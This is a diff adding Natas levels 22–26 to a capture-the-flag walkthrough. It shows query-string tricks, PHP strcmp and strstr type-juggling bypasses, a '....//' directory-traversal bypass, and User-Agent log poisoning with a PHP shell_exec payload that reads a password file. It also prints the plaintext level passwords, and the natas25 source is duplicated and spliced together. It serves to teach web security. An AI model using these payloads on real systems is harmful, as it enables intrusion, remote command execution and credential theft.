@@ -1054,5 +1054,289 @@ Another way to reach the same result but only using your browser is by:
 - reload the page and get natas22 credentials 
 <br/>
 
---
-To be continued...
+---
+### Natas 22
+Access the website with the link : http://natas22.natas.labs.overthewire.org . 
+Insert the credentials : 
+username : natas22
+password : 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s
+
+This time, after logging in, we can see only an empty page with the link to view the source code, let's inspect it.
+There are 2 PHP bloks:
+```php
+<?php
+session_start();
+
+if(array_key_exists("revelio", $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
+    header("Location: /");
+    }
+}
+?>
+```
+
+and 
+```php
+<?php
+    if(array_key_exists("revelio", $_GET)) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas23\n";
+    print "Password: <censored></pre>";
+    }
+?>
+```
+
+Similarly to the previous levels, the code is checking for some keys inside an array ("revelio"),  if there is a match with the right value some actions will be performed.
+There is another thing tho, if the admin key and its value are not in the array it will redirect us to the main page.
+
+We can continue by capturing the request of the page with Burp Suite and send it to repeater.
+Here we need to modify it request URL to include the magic word "revelio":
+
+In the first line add: `/index.php?revelio`, then press send  and here we have the password: qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj.
+<br/>
+
+---
+### Natas 23
+Access the website with the link : http://natas23.natas.labs.overthewire.org . 
+Insert the credentials : 
+Username: natas23
+Password: qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj
+
+Keep going with web-forms this time we have to provide a password and than press the login button.
+
+Let's review the source code, there is a PHP block:
+```php
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas24 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>  
+```
+
+The code here checks for the presence of the "passwd" key, then it is using the  `strstr()` function that searches for the first occurrence of a string inside another string and the length has to be over 10, but it will also return true for any value that we insert higher than the number 10 (es. 11).
+
+Now we can continue by capturing the submission request of the password (just write a random string), with Burp Suite and send it to repeater.
+In the first line you will see `GET /?passwd=teststring`.
+
+As we know how the `strstr()` function work and that we have to insert a number higher than 10 we can craft an URL like this
+```
+GET /?passwd=11iloveyou
+```
+
+So the `strstr()` function will take the value before the "iloveyou" string, and confront it with the second part of the if statement, 11 is > than 10, the if clause returns true and we get the password: 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r
+<br/>
+
+---
+### Natas 24
+Access the website with the link : http://natas24.natas.labs.overthewire.org . 
+Insert the credentials : 
+Username: natas24
+Password: 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r
+
+After accessing we have the same screen as in level 23, a web-form to submit the password, let's take a look at the source code:
+```php
+<?php    
+	if(array_key_exists("passwd",$_REQUEST)){  
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){  
+            echo "<br>The credentials for the next level are:<br>";  
+            echo "<pre>Username: natas25 Password: <censored></pre>";  
+        }  
+        else{  
+            echo "<br>Wrong!<br>";  
+        }  
+    }    
+    // morla / 10111  
+?>
+```
+
+The code-block is also very similar to the one we have just seen in the previous level, but this time in the if statement there is a new function.
+The `strcmp()` function has the job to compare 2 strings, if they are equal it will return `0`, if string1 is less than string 2 will return a value `<0` and if string1 is greater than string2 will return a value `>0`.
+
+There is another thing to notice: the function is preceded by an exclamation mark (`!`), which means that it flips the Boolean value.
+
+Searching on the internet i have found that that function has a known vulnerability, when comparing with a `Null` value that will cause to pass the comparison.
+In our scenario the way to do it is by setting an empty array ("passwd").
+
+To manipulate it we can either use Burp Suite or simply modify the URL in the browser, after clicking on Login to spawn the full URL:
+```http
+http://natas24.natas.labs.overthewire.org/?passwd[]=
+```
+
+This will cause an error and pass the comparison, spitting out our password: O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx
+<br/>
+
+---
+### Natas 25
+Access the website with the link : http://natas25.natas.labs.overthewire.org . 
+Insert the credentials : 
+Username: natas25
+Password: O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx
+
+Accessing the challenge we can see a long quote about the matter, atoms and the existence of God, beside that on the top right there is the chance to change the language of the text.
+
+Time to get more information from the source code, here the PHP script is taking care about the change language function and is trying to put some controls in order to stop known attacks like directory traversal or accessing specific files like the one containing the password.
+Later on it will also collect the requests' logs and save them in `/var/www/natas/natas25/logs/natas25_SESSION-ID.log`.
+
+```php
+<?php
+    // cheers and <3 to malvina
+    // - morla
+
+    function setLanguage(){
+        /* language setup */
+        if(array_key_exists("lang",$_REQUEST))
+            if(safeinclude("language/" . $_REQUEST["lang"] ))
+                return 1;
+        safeinclude("language/en"); 
+    }
+    
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) { 
+            include($filename);
+            return 1;
+        }
+        return 0;<?php
+    // cheers and <3 to malvina
+    // - morla
+
+    function setLanguage(){
+        /* language setup */
+        if(array_key_exists("lang",$_REQUEST))
+            if(safeinclude("language/" . $_REQUEST["lang"] ))
+                return 1;
+        safeinclude("language/en"); 
+    }
+    
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) { 
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+    
+    function listFiles($path){
+        $listoffiles=array();
+        if ($handle = opendir($path))
+            while (false !== ($file = readdir($handle)))
+                if ($file != "." && $file != "..")
+                    $listoffiles[]=$file;
+        
+        closedir($handle);
+        return $listoffiles;
+    } 
+    
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n"; 
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+?>
+    }
+    
+    function listFiles($path){
+        $listoffiles=array();
+        if ($handle = opendir($path))
+            while (false !== ($file = readdir($handle)))
+                if ($file != "." && $file != "..")
+                    $listoffiles[]=$file;
+        
+        closedir($handle);
+        return $listoffiles;
+    } 
+    
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n"; 
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+?>
+```
+
+
+My idea is to find a way to bypass the directory traversal, as it only check for `../` chars, this way we can access the file containing the password stored in `/etc/natas_webpass/natas26`.
+By doing so we won't get the password yet, that's because another check is made and it blocks and logs if we enter "web_pass".
+This is actually good for us as the content of the file will be saved in the logs and later we can find a way to access the log file and read the password.
+
+Let's begin:
+1. Find a bypass for directory traversal: 
+	Since here it checks only against a specific `../` we can use another common one: `....//`
+
+2.Get to the root:
+	Now we have to check where we are inside the machine and find our way into the root `/`, to do it start putting `..../` in the URL and check the error messages, after a couple of tries you will see the first warning saying that we are at `/`.
+```http
+http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//
+```
+
+3. Bypass the string filter:
+	I have tried encoding the "natas_webpass" part but didn't work.
+	Checking again the source code i have noticed that in the logs is saved also the user-agent, luckily for us it is saved in the super global variable `$_SERVER`. The good new is that it can also store the result of a command, so we can pass the cat command to it that will display the password and later save it into the logs.
+
+	In Burp Suite we can delete the old value of the user-agent header and insert this PHP payload
+```php
+<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>
+```
+
+Now the password is saved also in the logs!
+
+The success of this payload tells us that can run some other commands as well (like whoami, view the /etc/passwd), just put them inside the argument of `shell_exec("")` .
+
+4. Check the logs:
+	In order to construct the right path for the log file we firstly need to open dev tools or check in the Burp Suite request the value of PHPSESSID cookie, one we have it we can add it into the final path for the file and ultimate the URL.
+```http
+http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_kvheegd4dttljt9eh52k7j8ma8.log
+```
+
+And here it is: 8A506rfIAXbKKk68yJeuTuRq4UfcK70k
+<br/>
+
+---
+### Natas 26
+Access the website with the link : http://natas26.natas.labs.overthewire.org <br>
+Insert the credentials: <br> 
+Username: natas26 <br>
+Password: 8A506rfIAXbKKk68yJeuTuRq4UfcK70k <br>
+
+<br/>
+
+---
+**To Be Continued...**
+
